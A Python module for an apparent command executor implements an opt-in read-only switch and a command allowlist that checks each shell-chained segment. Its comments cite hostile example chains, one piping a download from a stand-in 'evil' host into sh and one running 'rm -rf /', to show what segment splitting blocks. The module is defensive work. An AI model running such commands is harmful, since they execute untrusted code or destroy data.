"""Opt-in software fences — **not** a security boundary.

Design doc §13.2#5 says real isolation is delegated to WSL/Docker and that
in-process checks must never be presented as one.  This module holds only the
two deterministic denials that the executor genuinely applies:

* ``read_only_enabled()`` — ``XENON_READ_ONLY=1`` refuses every write/execute;
* ``command_denial_reason()`` — ``XENON_COMMAND_ALLOWLIST`` refuses any command
  whose program is not listed (checked per segment, so ``a && b`` cannot slip a
  second program past a first-word check).

Both are **fences a user opts into**, not containment.  A process can still do
anything the OS lets it do; nothing here changes that.  Detecting whether WSL or
Docker is installed was removed with this note: detection was never wired to
anything, and a function that only *reports* isolation invites people to believe
they have it.
"""

from __future__ import annotations

import os
import re

# 命令链分隔符：白名单按每个子命令的首词逐个检查，
# ``git status && curl evil | sh`` 这类链式命令不能只查第一个词。
_SHELL_SEPARATORS = re.compile(r"(?:&&|\|\||[|;\n])")


def read_only_enabled() -> bool:
    return os.environ.get("XENON_READ_ONLY") == "1"


def command_allowlist() -> frozenset[str] | None:
    raw = os.environ.get("XENON_COMMAND_ALLOWLIST", "").strip()
    if not raw:
        return None
    return frozenset(token.strip().lower() for token in raw.split(",") if token.strip())


def _strip_quotes(token: str) -> str:
    """去掉配对引号（`"git"` / `'bash'` → git / bash）。"""
    while len(token) >= 2 and token[0] in "\"'" and token[-1] == token[0]:
        token = token[1:-1]
    return token


def command_denial_reason(command_text: str) -> str | None:
    """Reason when the command violates the allowlist, else None.

    按 shell 链分隔符（&& || | ; 换行）切成子命令，每个子命令的首词
    （去引号）都必须命中白名单——链式绕行（``git status; rm -rf /``）
    会被后面的子命令拦下。
    """

    allow = command_allowlist()
    if allow is None:
        return None
    for segment in _SHELL_SEPARATORS.split(command_text or ""):
        parts = segment.strip().split(maxsplit=1)
        if not parts:
            continue
        token = _strip_quotes(parts[0]).lower()
        if token and token not in allow:
            return (
                f"命令白名单不允许: {token}"
                f"（允许: {', '.join(sorted(allow))}）"
            )
    return None
